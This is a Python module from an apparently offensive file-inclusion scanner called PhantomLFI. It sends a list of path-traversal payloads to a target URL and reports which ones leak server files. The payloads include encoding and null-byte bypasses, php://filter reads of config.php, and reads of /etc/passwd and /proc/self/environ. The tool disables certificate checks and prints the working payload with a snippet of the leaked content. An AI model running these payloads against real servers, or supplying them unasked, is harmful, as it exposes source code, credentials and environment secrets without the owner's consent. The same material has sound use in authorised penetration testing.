"""
LFI/RFI vulnerability tester for PhantomLFI.
Sends a small curated set of payloads and checks if the target is vulnerable.
Returns the working payload.
Done by D4rk0ps
"""

import sys
import urllib.parse

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

from core.utils import print_colored


# Signatures that confirm successful LFI
SIGNATURES = {
    "/etc/passwd": ["root:", "daemon:", "bin:", "nobody:"],
    "/etc/hosts": ["127.0.0.1", "localhost"],
    "/etc/hostname": [],  # any non-error response
    "/proc/self/environ": ["PATH=", "HOME=", "USER=", "SHELL="],
    "/proc/version": ["Linux version"],
}

# Small curated detection payloads (ordered by likelihood)
DETECTION_PAYLOADS = [
    # Basic traversal depths
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",

    # Direct absolute path
    "/etc/passwd",

    # Null byte bypass (old PHP)
    "../../../../../../etc/passwd%00",
    "../../../../../../etc/passwd%00.php",
    "../../../../../../etc/passwd%00.html",

    # Slash bypass variants
    "....//....//....//....//....//....//etc/passwd",
    "..././..././..././..././..././..././etc/passwd",

    # URL encoded
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

    # Double URL encoded
    "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",

    # Unicode / UTF-8 overlong
    "%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",

    # Backslash variants
    "..\\..\\..\\..\\..\\..\\etc\\passwd",

    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",

    # file:// wrapper
    "file:///etc/passwd",
    "file:///etc/hosts",

    # /proc checks
    "../../../../../../proc/self/environ",
    "../../../../../../proc/version",

    # /etc/hosts as fallback
    "../../../../../../etc/hosts",
]


def check_requirements():
    """Check if requests library is available."""
    if not REQUESTS_AVAILABLE:
        print("\n  [!] 'requests' library required for --test mode")
        print("      Install: pip install requests\n")
        sys.exit(1)


def detect_signature(response_text: str, payload: str) -> bool:
    """Check if the response contains a known LFI signature.

    Args:
        response_text: HTTP response body.
        payload: The payload that was sent.

    Returns:
        True if a signature match is found.
    """
    text_lower = response_text.lower()

    # Check against known file signatures
    for target_file, sigs in SIGNATURES.items():
        if target_file in payload or target_file.replace("/", "%2f") in payload:
            if not sigs:
                # For files with no specific sig, check non-empty + no error
                if len(response_text.strip()) > 10:
                    return True
            for sig in sigs:
                if sig.lower() in text_lower:
                    return True

    # Check base64 response (php://filter payloads)
    if "php://filter" in payload:
        # Base64 response will be long alphanumeric
        stripped = response_text.strip()
        if len(stripped) > 50 and stripped.replace("\n", "").replace("\r", "").replace(" ", "").isascii():
            import base64
            try:
                decoded = base64.b64decode(stripped).decode("utf-8", errors="ignore")
                if "<?php" in decoded or "<html" in decoded.lower() or "function" in decoded:
                    return True
            except Exception:
                pass

    return False


def run_test(base_url: str, use_color: bool = True, timeout: int = 10):
    """Run LFI detection test against the target URL.

    Sends curated payloads and reports which ones succeed.

    Args:
        base_url: Target URL with injectable parameter.
        use_color: Whether to use colored output.
        timeout: HTTP request timeout in seconds.
    """
    check_requirements()

    print_colored("\n  ╔══════════════════════════════════════════╗", "cyan", use_color)
    print_colored("  ║       PhantomLFI — Vulnerability Test    ║", "cyan", use_color)
    print_colored("  ╚══════════════════════════════════════════╝", "cyan", use_color)
    print_colored(f"\n  Target: {base_url}", "white", use_color)
    print_colored(f"  Payloads: {len(DETECTION_PAYLOADS)}", "white", use_color)
    print_colored("  " + "─" * 50, "white", use_color)

    # First, get a baseline response (empty or normal param)
    baseline_len = 0
    try:
        baseline = requests.get(base_url, timeout=timeout, verify=False)
        baseline_len = len(baseline.text)
    except Exception:
        pass

    found = []
    tested = 0

    for payload in DETECTION_PAYLOADS:
        tested += 1
        full_url = f"{base_url}{payload}"

        try:
            response = requests.get(full_url, timeout=timeout, verify=False)
            status = response.status_code

            # Skip obvious failures
            if status in (404, 403, 500, 502, 503):
                print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] {status} — {payload[:60]}", "white", use_color)
                continue

            # Check for signature match
            if detect_signature(response.text, payload):
                print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] ✓ VULNERABLE — {payload[:60]}", "green", use_color)
                found.append({
                    "payload": payload,
                    "full_url": full_url,
                    "status": status,
                    "response_length": len(response.text),
                    "snippet": response.text[:200].strip(),
                })
            else:
                # Check if response length changed significantly from baseline
                if baseline_len > 0 and abs(len(response.text) - baseline_len) > 100:
                    print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] ? POSSIBLE — {payload[:60]}", "yellow", use_color)
                    found.append({
                        "payload": payload,
                        "full_url": full_url,
                        "status": status,
                        "response_length": len(response.text),
                        "snippet": response.text[:200].strip(),
                        "possible": True,
                    })
                else:
                    print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] ✗ {status} — {payload[:60]}", "white", use_color)

        except requests.exceptions.Timeout:
            print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] TIMEOUT — {payload[:60]}", "yellow", use_color)
        except requests.exceptions.ConnectionError:
            print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] CONN ERROR — {payload[:60]}", "red", use_color)
            break
        except Exception as e:
            print_colored(f"  [{tested}/{len(DETECTION_PAYLOADS)}] ERROR — {str(e)[:40]}", "red", use_color)

    # Results
    print_colored("\n  " + "═" * 50, "cyan", use_color)

    if not found:
        print_colored("  RESULT: No LFI vulnerability detected", "red", use_color)
        print_colored("  Try different parameters or deeper paths\n", "white", use_color)
        return

    confirmed = [f for f in found if not f.get("possible")]
    possible = [f for f in found if f.get("possible")]

    if confirmed:
        print_colored(f"\n  ✓ CONFIRMED VULNERABLE — {len(confirmed)} working payload(s):\n", "green", use_color)
        for i, hit in enumerate(confirmed, 1):
            print_colored(f"  ── Payload #{i} ──", "green", use_color)
            print_colored(f"  Payload : {hit['payload']}", "green", use_color)
            print_colored(f"  URL     : {hit['full_url']}", "green", use_color)
            print_colored(f"  Status  : {hit['status']}", "green", use_color)
            print_colored(f"  Length  : {hit['response_length']}", "green", use_color)
            print_colored(f"  Preview : {hit['snippet'][:120]}", "white", use_color)
            print()

    if possible:
        print_colored(f"\n  ? POSSIBLY VULNERABLE — {len(possible)} suspicious response(s):\n", "yellow", use_color)
        for i, hit in enumerate(possible, 1):
            print_colored(f"  Payload : {hit['payload']}", "yellow", use_color)
            print_colored(f"  URL     : {hit['full_url']}", "yellow", use_color)
            print_colored(f"  Length  : {hit['response_length']} (baseline: {baseline_len})", "yellow", use_color)
            print()

    print_colored("  " + "═" * 50 + "\n", "cyan", use_color)
